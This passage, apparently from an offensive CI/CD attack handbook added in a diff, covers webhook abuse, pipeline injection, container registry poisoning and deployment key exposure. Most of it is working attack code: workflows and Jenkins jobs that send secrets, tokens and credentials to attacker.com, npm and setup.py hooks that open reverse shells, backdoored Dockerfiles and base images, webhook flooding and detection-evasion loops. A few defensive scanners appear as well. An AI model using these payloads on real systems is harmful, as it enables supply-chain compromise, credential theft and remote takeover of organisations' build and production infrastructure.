+  -d '{
+    "branch": "main",
+    "parameters": {
+      "run_exploit": true,
+      "payload": "curl attacker.com | bash"
+    }
+  }' \
+  https://circleci.com/api/v2/project/gh/<org>/<repo>/pipeline
+```
+
+### Webhook DoS Attacks
+
+**Build Queue Flooding**
+
+```bash
+# Flood CI/CD with webhook triggers
+for i in {1..1000}; do
+    curl -X POST http://ci-server.com/webhook \
+      -H "Content-Type: application/json" \
+      -d '{"ref":"main","force_build":true}' &
+done
+
+# [Inference] Can exhaust:
+# - Build agent resources
+# - Queue capacity
+# - Storage for logs/artifacts
+```
+
+**Resource-Intensive Build Triggers**
+
+```bash
+# Trigger builds designed to consume maximum resources
+curl -X POST http://ci-server.com/webhook \
+  -d '{"ref":"expensive-build-branch"}'
+
+# Branch contains resource-intensive tasks:
+# - Large file compilations
+# - Extensive test suites
+# - Heavy Docker image builds
+```
+
+**Webhook Loop Creation**
+
+```bash
+# Create circular webhook triggers
+
+# Service A triggers Service B
+# Service B triggers Service A
+# [Inference] Creates infinite loop consuming resources
+
+# Example: Git push triggers build, build pushes to repo, which triggers another build
+```
+
+### Webhook Parameter Smuggling
+
+**JSON Parameter Injection**
+
+```bash
+# Exploit JSON parsing differences
+curl -X POST http://ci-server.com/webhook \
+  -H "Content-Type: application/json" \
+  -d '{
+    "branch": "main",
+    "branch": "malicious",
+    "repository": "target"
+  }'
+
+# [Inference] Different parsers may use different "branch" values
+```
+
+**Header Injection**
+
+```bash
+# Inject malicious headers via webhook
+curl -X POST http://ci-server.com/webhook \
+  -H "Content-Type: application/json" \
+  -H "X-Forwarded-For: 127.0.0.1" \
+  -H "X-Original-URL: /admin/execute" \
+  -d '{"ref":"main"}'
+
+# [Inference] May bypass IP-based restrictions or alter routing
+```
+
+**Content-Type Confusion**
+
+```bash
+# Send JSON as form data
+curl -X POST http://ci-server.com/webhook \
+  -H "Content-Type: application/x-www-form-urlencoded" \
+  -d 'payload={"ref":"main$(whoami)"}'
+
+# [Inference] May bypass JSON-specific validation
+```
+
+### Webhook Authentication Bypass
+
+**Missing Signature Validation**
+
+```bash
+# Many webhooks don't validate signatures properly
+# Send webhook without signature header
+
+curl -X POST http://ci-server.com/webhook \
+  -H "Content-Type: application/json" \
+  -d '{"ref":"main","unauthorized":true}'
+
+# [Inference] If server doesn't enforce signature presence
+```
+
+**IP Whitelist Bypass**
+
+```bash
+# If webhook validates source IP
+# Use X-Forwarded-For spoofing
+
+curl -X POST http://ci-server.com/webhook \
+  -H "X-Forwarded-For: 192.30.252.0" \
+  -H "Content-Type: application/json" \
+  -d '{"ref":"main"}'
+
+# GitHub's webhook IPs (example)
+# [Inference] Some servers trust X-Forwarded-For without validation
+```
+
+**OAuth Token Theft via Webhook**
+
+```bash
+# If webhook URL can be controlled
+# Set webhook to attacker server to capture OAuth tokens
+
+# Configure malicious webhook URL
+curl -X POST https://api.github.com/repos/<owner>/<repo>/hooks \
+  -H "Authorization: token <token>" \
+  -d '{
+    "config": {
+      "url": "https://attacker.com/capture",
+      "content_type": "json"
+    },
+    "events": ["push"]
+  }'
+
+# Attacker server logs incoming requests with tokens
+```
+
+### Webhook Data Exfiltration
+
+**Sensitive Data in Webhook Payloads**
+
+```python
+# Set up server to capture webhook data
+from flask import Flask, request
+import json
+
+app = Flask(__name__)
+
+@app.route('/webhook', methods=['POST'])
+def capture():
+    data = request.get_json()
+    
+    # Log all webhook data
+    with open('captured_webhooks.log', 'a') as f:
+        f.write(json.dumps(data, indent=2) + '\n')
+    
+    # Extract sensitive information
+    if 'environment' in data:
+        print(f"[!] Environment vars: {data['environment']}")
+    
+    if 'secrets' in data:
+        print(f"[!] Secrets found: {data['secrets']}")
+    
+    return '', 200
+
+app.run(host='0.0.0.0', port=8080)
+```
+
+**Build Status Webhooks**
+
+```bash
+# Many CI/CD systems send build status via webhook
+# These may contain:
+# - Commit messages with sensitive info
+# - Environment details
+# - Artifact URLs
+# - Error messages with stack traces
+
+# Configure callback webhook to capture this data
+curl -X POST http://jenkins.company.com/job/myproject/config.xml \
+  --data-urlencode config@- <<EOF
+<project>
+  <properties>
+    <hudson.plugins.postbuildtask.PostbuildTask>
+      <tasks>
+        <hudson.plugins.postbuildtask.TaskProperties>
+          <script>curl -X POST https://attacker.com/exfil -d @build.log</script>
+        </hudson.plugins.postbuildtask.TaskProperties>
+      </tasks>
+    </hudson.plugins.postbuildtask.PostbuildTask>
+  </properties>
+</project>
+EOF
+```
+
+### Webhook Persistence
+
+**Persistent Webhook Installation**
+
+```bash
+# Install webhook that survives configuration changes
+
+# GitHub - create webhook with admin token
+curl -X POST https://api.github.com/repos/<owner>/<repo>/hooks \
+  -H "Authorization: token <admin_token>" \
+  -d '{
+    "name": "web",
+    "active": true,
+    "events": ["push", "pull_request", "release"],
+    "config": {
+      "url": "https://attacker.com/persistent-webhook",
+      "content_type": "json",
+      "insecure_ssl": "1"
+    }
+  }'
+
+# [Inference] Remains active until explicitly removed
+```
+
+**Hidden Webhook Registration**
+
+```bash
+# Register webhook with innocuous-looking name
+curl -X POST https://gitlab.com/api/v4/projects/<id>/hooks \
+  --header "PRIVATE-TOKEN: <token>" \
+  -d "url=https://attacker.com/hook" \
+  -d "push_events=true" \
+  -d "note=Monitoring webhook for analytics"
+
+# Blends in with legitimate monitoring webhooks
+```
+
+### Webhook Monitoring and Detection Evasion
+
+**Randomized Timing**
+
+```python
+# Avoid detection by varying webhook trigger timing
+import time
+import random
+import requests
+
+webhook_url = "http://ci-server.com/webhook"
+payload = {"ref": "main", "malicious": True}
+
+while True:
+    # Random delay between 1-24 hours
+    delay = random.randint(3600, 86400)
+    time.sleep(delay)
+    
+    try:
+        requests.post(webhook_url, json=payload)
+    except:
+        pass
+```
+
+**Low-and-Slow Exploitation**
+
+```bash
+# Trigger malicious builds infrequently
+# Once per week at random times
+
+# Cron job on attacker-controlled server
+# 0 */168 * * * curl -X POST http://ci-server.com/webhook -d '{"ref":"backdoor-branch"}'
+
+# [Inference] Harder to detect than frequent malicious activity
+```
+
+### Webhook Fuzzing
+
+**Automated Webhook Fuzzing**
+
+```python
+import requests
+import json
+
+webhook_url = "http://ci-server.com/webhook"
+
+# Fuzz payloads
+payloads = [
+    {"ref": "main"},
+    {"ref": "main; whoami"},
+    {"ref": "main$(id)"},
+    {"ref": "main`curl attacker.com`"},
+    {"ref": "main\nmalicious\ncommand"},
+    {"ref": "main' OR '1'='1"},
+    {"ref": "../../../etc/passwd"},
+    {"ref": "main\x00truncate"},
+    {"ref": "A"*10000},  # Buffer overflow attempt
+    {"repository": {"url": "http://169.254.169.254/"}},  # SSRF
+]
+
+for payload in payloads:
+    try:
+        response = requests.post(webhook_url, json=payload, timeout=5)
+        print(f"Payload: {payload}")
+        print(f"Status: {response.status_code}")
+        print(f"Response: {response.text[:200]}\n")
+    except Exception as e:
+        print(f"Error with {payload}: {e}\n")
+```
+
+**Header Fuzzing**
+
+```bash
+# Test various authentication bypass techniques
+for header in "X-Forwarded-For" "X-Real-IP" "X-Original-URL" "X-Rewrite-URL"; do
+    curl -X POST http://ci-server.com/webhook \
+      -H "$header: 127.0.0.1" \
+      -H "Content-Type: application/json" \
+      -d '{"ref":"main"}' -v
+done
+```
+
+### Webhook Security Best Practices (Defense Perspective)
+
+**[Inference] Understanding defenses helps identify bypass opportunities:**
+
+1. **Signature Validation**
+    
+    - Look for weak secrets
+    - Test signature validation bypass
+    - Check for timing attack vulnerabilities
+2. **IP Whitelisting**
+    
+    - Test X-Forwarded-For spoofing
+    - Look for proxy misconfigurations
+    - Check for IPv6 bypass
+3. **Input Validation**
+    
+    - Test all payload fields
+    - Check for type confusion
+    - Test encoding/escaping bypasses
+4. **Rate Limiting**
+    
+    - Test distributed attacks
+    - Check for per-IP vs per-endpoint limits
+    - Test rate limit reset timing
+5. **Authentication**
+    
+    - Test token/secret brute force
+    - Check for authentication bypass
+    - Test for privilege escalation
+
+---
+
+## Related Topics and Subtopics
+
+**Important related areas to explore:**
+
+1. **Container Security** - Deep dive into container escape techniques, image scanning bypass, and runtime protection evasion
+    
+2. **Kubernetes Security** - RBAC exploitation, pod escape, secrets extraction from K8s clusters targeted by CI/CD
+    
+3. **Infrastructure as Code (IaC) Security** - Terraform/CloudFormation manipulation, state file poisoning, provider credential theft
+    
+4. **Source Code Management (SCM) Security** - Git exploitation, branch protection bypass, commit signing bypass
+    
+5. **Artifact Repository Security** - Repository manager exploitation (Nexus, Artifactory), package/dependency confusion attacks
+    
+6. **Cloud Provider Security** - AWS/GCP/Azure credential theft specific to CI/CD contexts, metadata service exploitation, role assumption attacks
+
+---
+
+## Pipeline Injection
+
+Pipeline injection occurs when attackers manipulate CI/CD configuration files, build scripts, or input data to execute arbitrary commands within the pipeline environment.
+
+### Attack Vectors and Methodology
+
+**Configuration File Manipulation:**
+
+CI/CD pipelines typically use configuration files that define build steps:
+
+```yaml
+# Common CI/CD configuration files
+.gitlab-ci.yml          # GitLab CI/CD
+.github/workflows/*.yml # GitHub Actions
+Jenkinsfile            # Jenkins
+.travis.yml            # Travis CI
+azure-pipelines.yml    # Azure DevOps
+bitbucket-pipelines.yml # Bitbucket Pipelines
+.circleci/config.yml   # CircleCI
+```
+
+**Direct Repository Access Attack:**
+
+```bash
+# If you have write access to repository (compromised developer account)
+git clone https://github.com/target/repo.git
+cd repo
+
+# Modify pipeline configuration to inject commands
+cat >> .gitlab-ci.yml << 'EOF'
+
+malicious_job:
+  stage: deploy
+  script:
+    - curl http://attacker.com/$(whoami)
+    - env | base64 | curl -X POST -d @- http://attacker.com/exfil
+    - cat /var/run/secrets/kubernetes.io/serviceaccount/token | curl -X POST -d @- http://attacker.com/k8s-token
+  only:
+    - main
+EOF
+
+git add .gitlab-ci.yml
+git commit -m "Update deployment configuration"
+git push origin main
+```
+
+**GitHub Actions Injection Example:**
+
+```yaml
+# .github/workflows/ci.yml - Vulnerable workflow
+name: CI Pipeline
+on: [push, pull_request]
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v2
+      - name: Run tests
+        run: echo "Testing branch ${{ github.head_ref }}"
+```
+
+**Exploitation via Branch Name Injection:**
+
+```bash
+# Create malicious branch name with command injection
+git checkout -b 'main; curl http://attacker.com/$(cat /etc/passwd | base64); echo'
+git push origin 'main; curl http://attacker.com/$(cat /etc/passwd | base64); echo'
+
+# When workflow executes:
+# echo "Testing branch main; curl http://attacker.com/$(cat /etc/passwd | base64); echo"
+# The injected commands execute in the runner context
+```
+
+**Environment Variable Injection:**
+
+```yaml
+# Vulnerable workflow using user-controlled input
+- name: Deploy
+  run: |
+    echo "Deploying version: ${{ github.event.head_commit.message }}"
+    ./deploy.sh "${{ github.event.head_commit.message }}"
+```
+
+**Exploitation:**
+
+```bash
+# Craft malicious commit message
+git commit -m "v1.0.0\"; curl http://attacker.com/\$(env|base64); echo \""
+git push
+
+# Executed command becomes:
+# ./deploy.sh "v1.0.0"; curl http://attacker.com/$(env|base64); echo ""
+```
+
+### Pull Request Poisoning
+
+**Attack Flow:**
+
+1. Fork target repository
+2. Modify workflow files or scripts called by workflows
+3. Submit pull request
+4. Wait for CI/CD to execute on pull request branch
+
+**Example Malicious Workflow Addition:**
+
+```yaml
+# Added to .github/workflows/pr-check.yml
+name: PR Validation
+on: pull_request
+
+jobs:
+  exfiltrate:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Extract secrets
+        run: |
+          echo "${{ toJSON(secrets) }}" | base64 | curl -X POST -d @- http://attacker.com/secrets
+          echo "${{ toJSON(vars) }}" | base64 | curl -X POST -d @- http://attacker.com/vars
+          env | grep -i 'token\|key\|secret\|password' | base64 | curl -X POST -d @- http://attacker.com/env
+```
+
+[Unverified] Some CI/CD platforms may restrict workflow modifications in pull requests from forks, but configuration varies by platform and repository settings.
+
+### Script Injection via Dependencies
+
+**Package Manager Hook Exploitation:**
+
+```json
+// package.json - Node.js example
+{
+  "name": "legitimate-package",
+  "version": "1.0.0",
+  "scripts": {
+    "preinstall": "curl http://attacker.com/$(whoami) && curl http://attacker.com/$(env|base64)",
+    "postinstall": "node -e \"require('child_process').exec('bash -i >& /dev/tcp/attacker.com/4444 0>&1')\""
+  }
+}
+```
+
+**Python Setup Hook:**
+
+```python
+# setup.py
+import os
+import subprocess
+from setuptools import setup
+from setuptools.command.install import install
+
+class PostInstallCommand(install):
+    def run(self):
+        install.run(self)
+        # Malicious payload
+        subprocess.call(['curl', 'http://attacker.com/$(env|base64)'], shell=True)
+        os.system('bash -c "bash -i >& /dev/tcp/attacker.com/4444 0>&1"')
+
+setup(
+    name='legitimate-package',
+    version='1.0.0',
+    cmdclass={'install': PostInstallCommand}
+)
+```
+
+### Jenkins Pipeline Injection
+
+**Groovy Script Injection:**
+
+```groovy
+// Jenkinsfile
+pipeline {
+    agent any
+    parameters {
+        string(name: 'VERSION', defaultValue: '1.0', description: 'Version to deploy')
+    }
+    stages {
+        stage('Deploy') {
+            steps {
+                // VULNERABLE: Unsanitized parameter usage
+                sh "echo Deploying version: ${params.VERSION}"
+            }
+        }
+    }
+}
+```
+
+**Exploitation:**
+
+```bash
+# Trigger build with malicious parameter via API
+curl -X POST "https://jenkins.target.com/job/deploy/buildWithParameters" \
+  --user "username:api-token" \
+  --data-urlencode "VERSION=1.0; curl http://attacker.com/\$(cat /var/jenkins_home/secrets/master.key | base64)"
+
+# Or through UI: Set VERSION parameter to:
+1.0; wget http://attacker.com/shell.sh -O /tmp/shell.sh && bash /tmp/shell.sh
+```
+
+**Shared Library Poisoning:**
+
+```groovy
+// vars/deployLib.groovy in shared library repository
+def call(Map config) {
+    // Malicious code in shared library
+    sh """
+        curl http://attacker.com/jenkins-secrets -d "\$(cat /var/jenkins_home/credentials.xml | base64)"
+        ${config.deployCommand}
+    """
+}
+```
+
+### GitLab CI/CD Injection Techniques
+
+**Variable Expansion Exploitation:**
+
+```yaml
+# .gitlab-ci.yml
+variables:
+  DOCKER_IMAGE: "registry.example.com/app"
+
+deploy:
+  script:
+    - echo "Deploying $DOCKER_IMAGE:$CI_COMMIT_REF_NAME"
+    - docker pull $DOCKER_IMAGE:$CI_COMMIT_REF_NAME
+    - docker run $DOCKER_IMAGE:$CI_COMMIT_REF_NAME
+```
+
+**Exploitation via Branch/Tag Names:**
+
+```bash
+# Create malicious tag
+git tag -a "latest; curl http://attacker.com/\$(env|base64); echo" -m "Release"
+git push origin "latest; curl http://attacker.com/\$(env|base64); echo"
+
+# Executed command becomes:
+# docker pull registry.example.com/app:latest; curl http://attacker.com/$(env|base64); echo
+```
+
+**Runner Token Extraction:**
+
+```yaml
+# Add to .gitlab-ci.yml
+exfiltrate:
+  script:
+    - cat /etc/gitlab-runner/config.toml
+    - curl -X POST http://attacker.com/runner-config -d @/etc/gitlab-runner/config.toml
+    - echo $CI_JOB_TOKEN | base64 | curl -X POST -d @- http://attacker.com/job-token
+```
+
+### Tools for Pipeline Injection
+
+**Gitleaks - Secret Detection:**
+
+```bash
+# Install
+wget https://github.com/gitleaks/gitleaks/releases/download/v8.18.0/gitleaks_8.18.0_linux_x64.tar.gz
+tar -xzf gitleaks_8.18.0_linux_x64.tar.gz
+sudo mv gitleaks /usr/local/bin/
+
+# Scan repository for secrets in pipeline files
+gitleaks detect --source /path/to/repo --verbose
+
+# Scan specific file
+gitleaks detect --source .gitlab-ci.yml --no-git
+
+# Output to JSON for parsing
+gitleaks detect --source /path/to/repo --report-format json --report-path results.json
+```
+
+**TruffleHog - Deep History Scanning:**
+
+```bash
+# Install
+pip3 install truffleHog
+
+# Scan entire Git history
+trufflehog git https://github.com/target/repo.git --json > findings.json
+
+# Scan specific branch
+trufflehog git https://github.com/target/repo.git --branch dev
+
+# Focus on high entropy strings (keys, tokens)
+trufflehog git https://github.com/target/repo.git --regex --entropy=True
+```
+
+**Custom Pipeline Injection Scanner:**
+
+```bash
+#!/bin/bash
+# ci-injection-scanner.sh
+
+REPO_PATH=$1
+
+echo "[*] Scanning for CI/CD injection vulnerabilities in: $REPO_PATH"
+
+# Find all CI/CD configuration files
+CI_FILES=$(find "$REPO_PATH" -type f \( \
+  -name ".gitlab-ci.yml" -o \
+  -name "Jenkinsfile" -o \
+  -name ".travis.yml" -o \
+  -name "azure-pipelines.yml" -o \
+  -name "bitbucket-pipelines.yml" -o \
+  -path "*/.github/workflows/*.yml" -o \
+  -path "*/.circleci/config.yml" \))
+
+echo "[*] Found CI/CD files:"
+echo "$CI_FILES"
+
+# Check for dangerous patterns
+echo -e "\n[*] Checking for injection vulnerabilities..."
+
+for file in $CI_FILES; do
+  echo -e "\n[+] Analyzing: $file"
+  
+  # Check for unquoted variable expansion
+  grep -n '\${{' "$file" | grep -v '"' && echo "    [!] Unquoted variable expansion found"
+  
+  # Check for eval usage
+  grep -n 'eval' "$file" && echo "    [!] eval usage detected"
+  
+  # Check for script blocks with variables
+  grep -n 'script:' "$file" -A 5 | grep '\$' && echo "    [!] Variable in script block"
+  
+  # Check for pull_request triggers
+  grep -n 'pull_request' "$file" && echo "    [INFO] PR trigger found - check if secrets exposed"
+  
+  # Check for hardcoded credentials
+  grep -ni 'password\|secret\|token\|key' "$file" | grep -v '\${{' && echo "    [!] Potential hardcoded secret"
+done
+
+echo -e "\n[*] Scan complete"
+```
+
+**Usage:**
+
+```bash
+chmod +x ci-injection-scanner.sh
+./ci-injection-scanner.sh /path/to/target-repo
+```
+
+## Container Registry Poisoning
+
+Container registry poisoning involves compromising container images stored in registries (Docker Hub, AWS ECR, Azure ACR, Google GCR, GitLab Registry) to inject malicious code into the software supply chain.
+
+### Attack Methodology
+
+**Registry Credential Compromise:**
+
+```bash
+# Common locations for registry credentials
+~/.docker/config.json           # Docker CLI credentials
+/var/run/docker.sock            # Docker daemon socket
+~/.aws/credentials              # AWS ECR credentials
+~/. azure/credentials           # Azure ACR credentials
+~/.config/gcloud/               # GCP GCR credentials
+
+# Extract Docker credentials
+cat ~/.docker/config.json
+cat ~/.docker/config.json | jq -r '.auths'
+
+# Decode base64 auth tokens
+cat ~/.docker/config.json | jq -r '.auths["registry.example.com"].auth' | base64 -d
+```
+
+**Docker Hub Authentication:**
+
+```bash
+# Found credentials in CI/CD environment variables
+export DOCKER_USERNAME="compromised-user"
+export DOCKER_PASSWORD="compromised-pass"
+
+# Login to Docker Hub
+echo "$DOCKER_PASSWORD" | docker login -u "$DOCKER_USERNAME" --password-stdin
+
+# List accessible repositories
+docker search $DOCKER_USERNAME
+
+# Pull legitimate image
+docker pull company/production-app:latest
+```
+
+**Image Manipulation and Reupload:**
+
+```bash
+# Pull target image
+docker pull company/production-app:latest
+
+# Create malicious Dockerfile based on target
+cat > Dockerfile.malicious << 'EOF'
+FROM company/production-app:latest
+
+# Add backdoor user
+RUN useradd -m -s /bin/bash backdoor && \
+    echo 'backdoor:P@ssw0rd123' | chpasswd && \
+    usermod -aG sudo backdoor
+
+# Install reverse shell
+RUN echo '#!/bin/bash\nbash -i >& /dev/tcp/attacker.com/4444 0>&1' > /usr/local/bin/reverse-shell && \
+    chmod +x /usr/local/bin/reverse-shell
+
+# Add cron job for persistence
+RUN echo '*/5 * * * * /usr/local/bin/reverse-shell' | crontab -
+
+# Add SSH backdoor
+RUN mkdir -p /root/.ssh && \
+    echo 'ssh-rsa AAAAB3NzaC1yc2E... attacker@evil.com' >> /root/.ssh/authorized_keys && \
+    chmod 600 /root/.ssh/authorized_keys
+
+# Modify entrypoint to execute backdoor first
+RUN mv /entrypoint.sh /entrypoint.original.sh
+COPY entrypoint-wrapper.sh /entrypoint.sh
+RUN chmod +x /entrypoint.sh
+
+ENTRYPOINT ["/entrypoint.sh"]
+EOF
+
+# Create entrypoint wrapper
+cat > entrypoint-wrapper.sh << 'EOF'
+#!/bin/bash
+# Execute backdoor in background
+nohup /usr/local/bin/reverse-shell &
+# Execute original entrypoint
+exec /entrypoint.original.sh "$@"
+EOF
+
+# Build poisoned image
+docker build -f Dockerfile.malicious -t company/production-app:latest .
+
+# Push poisoned image (overwrites legitimate image)
+docker push company/production-app:latest
+```
+
+**Tag Manipulation:**
+
+```bash
+# Pull specific version
+docker pull company/app:v1.2.3
+
+# Create poisoned version
+docker build -t company/app:v1.2.3 -f Dockerfile.malicious .
+
+# Push with same tag (if registry allows overwrites)
+docker push company/app:v1.2.3
+
+# Also push to commonly used tags
+docker tag company/app:v1.2.3 company/app:latest
+docker push company/app:latest
+
+docker tag company/app:v1.2.3 company/app:stable
+docker push company/app:stable
+
+docker tag company/app:v1.2.3 company/app:production
+docker push company/app:production
+```
+
+### Registry-Specific Exploitation
+
+**AWS ECR Poisoning:**
+
+```bash
+# Authenticate to ECR (if credentials compromised)
+aws ecr get-login-password --region us-east-1 | \
+  docker login --username AWS --password-stdin 123456789012.dkr.ecr.us-east-1.amazonaws.com
+
+# List repositories
+aws ecr describe-repositories --region us-east-1
+
+# List images in repository
+aws ecr list-images --repository-name production-app --region us-east-1
+
+# Pull target image
+docker pull 123456789012.dkr.ecr.us-east-1.amazonaws.com/production-app:latest
+
+# Create and push poisoned image
+docker build -t 123456789012.dkr.ecr.us-east-1.amazonaws.com/production-app:latest .
+docker push 123456789012.dkr.ecr.us-east-1.amazonaws.com/production-app:latest
+
+# If you have ECR permissions, modify repository policy for persistence
+aws ecr set-repository-policy \
+  --repository-name production-app \
+  --policy-text file://malicious-policy.json
+```
+
+**Malicious ECR Policy Example:**
+
+```json
+{
+  "Version": "2012-10-17",
+  "Statement": [
+    {
+      "Sid": "AllowAttackerAccount",
+      "Effect": "Allow",
+      "Principal": {
+        "AWS": "arn:aws:iam::ATTACKER-ACCOUNT-ID:root"
+      },
+      "Action": [
+        "ecr:BatchGetImage",
+        "ecr:GetDownloadUrlForLayer",
+        "ecr:PutImage"
+      ]
+    }
+  ]
+}
+```
+
+**Azure Container Registry (ACR) Poisoning:**
+
+```bash
+# Login to ACR
+az acr login --name targetregistry
+
+# Or with service principal credentials
+docker login targetregistry.azurecr.io \
+  --username $SP_APP_ID \
+  --password $SP_PASSWORD
+
+# List repositories
+az acr repository list --name targetregistry --output table
+
+# List tags
+az acr repository show-tags --name targetregistry --repository production-app
+
+# Pull and poison
+docker pull targetregistry.azurecr.io/production-app:latest
+docker build -t targetregistry.azurecr.io/production-app:latest .
+docker push targetregistry.azurecr.io/production-app:latest
+```
+
+**Google Container Registry (GCR) Poisoning:**
+
+```bash
+# Authenticate to GCR
+gcloud auth configure-docker
+
+# Or use service account key
+cat service-account-key.json | docker login -u _json_key --password-stdin https://gcr.io
+
+# List images
+gcloud container images list --repository=gcr.io/project-id
+
+# List tags
+gcloud container images list-tags gcr.io/project-id/production-app
+
+# Pull, poison, and push
+docker pull gcr.io/project-id/production-app:latest
+docker build -t gcr.io/project-id/production-app:latest .
+docker push gcr.io/project-id/production-app:latest
+```
+
+### Layer-Based Poisoning
+
+**Inspect Image Layers:**
+
+```bash
+# View image history
+docker history company/app:latest
+
+# Extract image filesystem
+docker save company/app:latest -o app-image.tar
+tar -xf app-image.tar
+
+# Examine layer contents
+ls -la */layer.tar
+tar -tf */layer.tar | grep -i 'passwd\|shadow\|key\|credential'
+
+# Extract specific layer
+tar -xf <layer-hash>/layer.tar
+```
+
+**Inject Malicious Layer:**
+
+```dockerfile
+# Create minimal malicious layer
+FROM company/app:latest
+
+# Single layer with backdoor
+RUN echo 'bash -i >& /dev/tcp/attacker.com/4444 0>&1' > /tmp/.backdoor && \
+    chmod +x /tmp/.backdoor && \
+    echo '@reboot /tmp/.backdoor' | crontab -
+```
+
+This approach creates a smaller forensic footprint compared to extensive modifications.
+
+### Tools for Registry Exploitation
+
+**Docker-Registry-Client:**
+
+```bash
+# Install
+git clone https://github.com/andrey-pohilko/registry-cli
+cd registry-cli
+
+# List repositories (anonymous or authenticated)
+./registry.py -r https://registry.example.com -l admin:password list
+
+# Get image tags
+./registry.py -r https://registry.example.com -l admin:password list-tags company/app
+
+# Delete tag (if permissions allow)
+./registry.py -r https://registry.example.com -l admin:password delete-tag company/app:latest
+
+# Delete entire image
+./registry.py -r https://registry.example.com -l admin:password delete company/app
+```
+
+**Dive - Image Layer Analysis:**
+
+```bash
+# Install
+wget https://github.com/wagoodman/dive/releases/download/v0.11.0/dive_0.11.0_linux_amd64.deb
+sudo dpkg -i dive_0.11.0_linux_amd64.deb
+
+# Analyze image interactively
+dive company/app:latest
+
+# Show layer contents and changes
+# Navigate with arrow keys, Tab to switch panes
+# Look for added files, modified binaries, suspicious scripts
+```
+
+**Trivy - Vulnerability and Secret Scanning:**
+
+```bash
+# Install
+wget https://github.com/aquasecurity/trivy/releases/download/v0.48.0/trivy_0.48.0_Linux-64bit.deb
+sudo dpkg -i trivy_0.48.0_Linux-64bit.deb
+
+# Scan image for vulnerabilities
+trivy image company/app:latest
+
+# Scan for secrets in image
+trivy image --scanners secret company/app:latest
+
+# Scan for misconfigurations
+trivy image --scanners config company/app:latest
+
+# Output in JSON for parsing
+trivy image -f json -o results.json company/app:latest
+```
+
+**Registry Dumper Script:**
+
+```bash
+#!/bin/bash
+# registry-dumper.sh - Extract all images from registry
+
+REGISTRY=$1
+USERNAME=$2
+PASSWORD=$3
+OUTPUT_DIR="registry_dump_$(date +%Y%m%d_%H%M%S)"
+
+mkdir -p "$OUTPUT_DIR"
+
+echo "[*] Authenticating to registry: $REGISTRY"
+echo "$PASSWORD" | docker login "$REGISTRY" -u "$USERNAME" --password-stdin
+
+# This script structure requires registry API v2
+# List all repositories
+REPOS=$(curl -s -u "$USERNAME:$PASSWORD" "https://$REGISTRY/v2/_catalog" | jq -r '.repositories[]')
+
+echo "[*] Found repositories:"
+echo "$REPOS"
+
+for repo in $REPOS; do
+  echo "[+] Processing repository: $repo"
+  
+  # Get tags for repository
+  TAGS=$(curl -s -u "$USERNAME:$PASSWORD" "https://$REGISTRY/v2/$repo/tags/list" | jq -r '.tags[]')
+  
+  for tag in $TAGS; do
+    IMAGE="$REGISTRY/$repo:$tag"
+    echo "    [+] Pulling: $IMAGE"
+    
+    docker pull "$IMAGE"
+    docker save "$IMAGE" -o "$OUTPUT_DIR/${repo//\//_}_${tag}.tar"
+    
+    echo "    [✓] Saved to: $OUTPUT_DIR/${repo//\//_}_${tag}.tar"
+  done
+done
+
+echo "[*] Registry dump complete. Output: $OUTPUT_DIR"
+```
+
+**Usage:**
+
+```bash
+chmod +x registry-dumper.sh
+./registry-dumper.sh registry.example.com admin password123
+```
+
+### Supply Chain Attack via Base Images
+
+**Poisoning Common Base Images:**
+
+If you gain access to accounts that publish popular base images:
+
+```bash
+# Example: Compromised account publishing widely-used base image
+docker login -u compromised-publisher
+
+# Pull official base image
+docker pull node:18-alpine
+
+# Create Dockerfile with backdoor
+cat > Dockerfile << 'EOF'
+FROM node:18-alpine
+
+# Subtle backdoor in commonly used base image
+RUN echo '#!/bin/sh' > /usr/local/bin/npm-install-backdoor && \
+    echo 'if [ -f package.json ]; then' >> /usr/local/bin/npm-install-backdoor && \
+    echo '  curl -s http://attacker.com/collect -d "$(pwd):$(cat package.json | base64)"' >> /usr/local/bin/npm-install-backdoor && \
+    echo 'fi' >> /usr/local/bin/npm-install-backdoor && \
+    echo 'exec /usr/local/bin/npm.original "$@"' >> /usr/local/bin/npm-install-backdoor && \
+    chmod +x /usr/local/bin/npm-install-backdoor && \
+    mv /usr/local/bin/npm /usr/local/bin/npm.original && \
+    mv /usr/local/bin/npm-install-backdoor /usr/local/bin/npm
+EOF
+
+# Build and push as legitimate-looking variant
+docker build -t compromised-publisher/node:18-alpine-slim .
+docker push compromised-publisher/node:18-alpine-slim
+
+# Downstream users who use FROM compromised-publisher/node:18-alpine-slim
+# will unknowingly include the backdoor in their builds
+```
+
+## Deployment Key Exposure
+
+Deployment keys (SSH keys, API tokens, service account credentials) grant CI/CD pipelines access to production infrastructure. Their exposure enables direct production compromise.
+
+### Common Exposure Locations
+
+**CI/CD Environment Variables:**
+
+```bash
+# GitLab CI/CD variable extraction
+# If you have pipeline access, add job to .gitlab-ci.yml:
+
+exfiltrate_secrets:
+  script:
+    - env
+    - env | base64 | curl -X POST -d @- http://attacker.com/gitlab-secrets
+  only:
+    - main
+```
+
+**GitHub Actions Secrets Extraction:**
+
+```yaml
+# .github/workflows/exfil-secrets.yml
+name: Extract Secrets
+on: [push]
+
+jobs:
+  exfiltrate:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Dump all secrets
+        env:
+          ALL_SECRETS: ${{ toJSON(secrets) }}
+        run: |
+          echo "$ALL_SECRETS" | base64 | curl -X POST -d @- http://attacker.com/gh-secrets
+          
+      - name: Dump specific secrets
+        run: |
+          echo "${{ secrets.AWS_ACCESS_KEY_ID }}" | curl -X POST -d @- http://attacker.com/aws-key
+          echo "${{ secrets.AWS_SECRET_ACCESS_KEY }}" | curl -X POST -d @- http://attacker.com/aws-secret
+          echo "${{ secrets.DEPLOY_SSH_KEY }}" | curl -X POST -d @- http://attacker.com/ssh-key
+```
+
+**Jenkins Credentials:**
+
+```bash
+# If you have access to Jenkins master filesystem
+# Credentials stored in:
+/var/jenkins_home/credentials.xml
+/var/jenkins_home/secrets/master.key
+/var/jenkins_home/secrets/hudson.util.Secret
+
+# Extract credentials using Jenkins Script Console (Manage Jenkins > Script Console)
+def creds = com.cloudbees.plugins.credentials.CredentialsProvider.lookupCredentials(
+    com.cloudbees.plugins.credentials.common.StandardUsernameCredentials.class,
+    Jenkins.instance,
+    null,
+    null
+)
+
+for (c in creds) {
+    println("ID: " + c.id)
+    println("Username: " + c.username)
+    println("Password: " + c.password)
+    println("Description: " + c.description)
+    println("---")
+}
+```
+
+**SSH Key Extraction:**
+
+```bash
+# Common SSH key locations in CI/CD runners
+~/.ssh/id_rsa
+~/.ssh/id_ed25519
